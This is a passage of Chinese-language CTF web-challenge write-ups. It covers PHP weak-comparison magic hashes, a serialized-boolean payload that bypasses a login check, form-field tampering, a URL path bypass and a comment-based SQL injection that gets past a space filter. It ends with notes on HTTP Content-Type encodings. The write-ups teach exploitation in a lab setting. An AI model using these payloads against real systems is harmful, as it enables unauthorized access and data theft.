var_dump("0e123456"=="0e4456789"); //true 
?>  
  ~~~

a、 观察上述代码，`"admin"==0` 比较的时候，会将`admin`转化成数值，强制转化,由于`admin`是字符串，转化的结果是`0`，自然和`0`相等
b、 `"1admin"==1` 比较的时候会将`1admin`转化成数值,结果为`1`，而`“admin1“==1` 却等于错误，也就是`"admin1"`被转化成了`0`,为什么呢？？

```
当一个字符串欸当作一个数值来取值，其结果和类型如下:如果该字符串没有包含'.','e','E'并且其数值值在整形的范围之内
该字符串被当作int来取值，其他所有情况下都被作为float来取值，该字符串的开始部分决定了它的值，如果该字符串以合法的数值开始，则使用该数值，否则其值为0。
```

c、 `"0e123456"=="0e456789"`相互比较的时候，会将`0e`这类字符串识别为科学技术法的数字，`0`的无论多少次方都是零，所以相等

  因此只要找到一个字串加密后第一个字符为0即可，这里提供几个：240610708，aabC9RqS 可以验证
  3. 将用户名使用240610708，可以得到![](WEB\天网管理系统\2.png)
  4. 访问里面的网址得到![](WEB\天网管理系统\3.png)插播关于php 序列化与反序列化

    serialize（） 对输入的数据进行序列化转换
    unserialize() 恢复原先变量，还原已经序列化的对象。
    题目意思就是post提交的password值经过"反序列化"得到一个数组，要求数组里的user和pass都等于某个值时就打印flag。
    ![](WEB\天网管理系统\4.png)或者通过构造：借一句话 成也bool  败也bool bool类型的true跟任意字符串可以弱类型相等。可以构造bool类型的序列化数据 ，无论比较的值是什么，结果都为true。（a代表array，s代表string，b代表bool，而数字代表个数/长度）
  5. 得到password:

    a:2:{s:4:"user";b:1;s:4:"pass";b:1;}提交得到flag ![](WEB\天网管理系统\5.png)

  ## Forms

  1. 这道题比较简单，用burpsuite抓包，随便输入一个pin值，![](WEB\Forms\1.png)发现提交PIN值时还会提交一个showsource的值，将这个值改为1再次提交![](WEB\Forms\2.png)得到一串源码，意思是PIN等于
-19827747736161128312837161661727773716166727272616149001823847时就能得到flag，更改PIN值![](WEB\Forms\3.png)

## 拐弯抹角
1. 
 ```
 <?php
// code by SEC@USTC

echo '<html><head><meta http-equiv="charset" content="gbk"></head><body>';

$URL = $_SERVER['REQUEST_URI'];
//echo 'URL: '.$URL.'<br/>';
$flag = "CTF{???}";

$code = str_replace($flag, 'CTF{???}', file_get_contents('./index.php'));
$stop = 0;

//这道题目本身也有教学的目的
//第一，我们可以构造 /indirection/a/../ /indirection/./ 等等这一类的
//所以，第一个要求就是不得出现 ./
if($flag && strpos($URL, './') !== FALSE){
    $flag = "";
    $stop = 1;        //Pass
}

//第二，我们可以构造 \ 来代替被过滤的 /
//所以，第二个要求就是不得出现 ../
if($flag && strpos($URL, '\\') !== FALSE){
    $flag = "";
    $stop = 2;        //Pass
}

//第三，有的系统大小写通用，例如 indirectioN/
//你也可以用?和#等等的字符绕过，这需要统一解决
//所以，第三个要求对可以用的字符做了限制，a-z / 和 .
$matches = array();
preg_match('/^([0-9a-z\/.]+)$/', $URL, $matches);
if($flag && empty($matches) || $matches[1] != $URL){
    $flag = "";
    $stop = 3;        //Pass
}

//第四，多个 / 也是可以的
//所以，第四个要求是不得出现 //
if($flag && strpos($URL, '//') !== FALSE){
    $flag = "";
    $stop = 4;        //Pass
}

//第五，显然加上index.php或者减去index.php都是可以的
//所以我们下一个要求就是必须包含/index.php，并且以此结尾
if($flag && substr($URL, -10) !== '/index.php'){
    $flag = "";
    $stop = 5;        //Not Pass
}

//第六，我们知道在index.php后面加.也是可以的
//所以我们禁止p后面出现.这个符号
if($flag && strpos($URL, 'p.') !== FALSE){
    $flag = "";
    $stop = 6;        //Not Pass
}

//第七，现在是最关键的时刻
//你的$URL必须与/indirection/index.php有所不同
if($flag && $URL == '/indirection/index.php'){
    $flag = "";
    $stop = 7;        //Not Pass
}
if(!$stop) $stop = 8;

echo 'Flag: '.$flag;
echo '<hr />';
for($i = 1; $i < $stop; $i++)
    $code = str_replace('//Pass '.$i, '//Pass', $code);
for(; $i < 8; $i++)
    $code = str_replace('//Pass '.$i, '//Not Pass', $code);


echo highlight_string($code, TRUE);

echo '</body></html>';
 ```
 题目的意思就是通过改变地址栏访问index.php，但是限制了条件不能使用 ./  ../ \\ 而且只能使用小写字母，不可以在php后加点，这里我们可以利用伪静态技术，使用http://ctf5.shiyanbar.com/indirection/index.php/index.php，index.php后的index.php会被当做参数处理，所以服务器只会解析第一个index.php，满足条件成功绕过。


## 天下武功为快不破

 1. 用burpsuite抓包，![](WEB\天下武功唯快不破\1.png)，题目提示尽快的提交key值，从响应头可以发现有一个FLAG字段![](WEB\天下武功唯快不破\2.png)，经过BASE64解码得到P0ST_THIS_T0_CH4NGE_FL4G:rLy7KYD1r，用burpsuite提交，没有出来正确结果，又想到刚才的提示中提到 , 要尽可能得快速提交 , 因此开始写[脚本](WEB\快.py)()，自己手动的再快也没有机器快。

## 简单的sql注入

1. 通过加英文单引号1‘ ，检测到存在注入：   php?id=1  ![](WEB\简单的sql注入\1.png)
2. 按常规步骤输入1 and 1=1和1 and 1=2的时候，发现报了“SQLi deteced!”而无法查询：php?1 and 1=1  php?1 and 1=2   ![](WEB\简单的sql注入\2.png) 那么，去掉空格输入1and1=1和1and1=2呢？ ![](WEB\简单的sql注入\3.png) 确定是过滤了空格！
3. 绕过过滤空格的进行手工注入，常用一对英文括号()或者程序中常用的一对注释符/**/来替代空格。 ![](WEB\简单的sql注入\4.png)
4. 输入1'/**/union/**/select/**/flag/**/from/**/flag/**/where/**/'1'='1，顺利输出预期结果： 【至于字段flag和表flag就是纯粹猜测的】![](WEB\简单的sql注入\5.png)



## Http Header里的Content-Type一般有这三种：

 `application/x-www-form-urlencoded`：数据被编码为名称/值对。这是标准的编码格式。
 `multipart/form-data`： 数据被编码为一条消息，页上的每个控件对应消息中的一个部分。
 `text/plain`： 数据以纯文本形式(text/json/xml/html)进行编码，其中不含任何控件或格式字符。postman软件里标的是RAW。

form的`enctype`属性为编码方式，常用有两种：`application/x-www-form-urlencoded`和`multipart/form-data`，默认为`application/x-www-form-urlencoded`。

当action为get时候，浏览器用`x-www-form-urlencoded`的编码方式把form数据转换成一个字串（name1=value1&name2=value2...），然后把这个字串追加到url后面，用`?`分割，加载这个新的url。

当action为post时候，浏览器把form数据封装到http body中，然后发送到server。 如果没有`type=file`的控件，用默认的application/x-www-form-urlencoded就可以了。 但是如果有`type=file`的话，就要用到multipart/form-data了。

当action为post且Content-Type类型是`multipart/form-data`，浏览器会把整个表单以控件为单位分割，并为每个部分加上Content-Disposition(form-data或者file),Content-Type(默认为text/plain),name(控件`name`)等信息，并加上分割符(boundary)。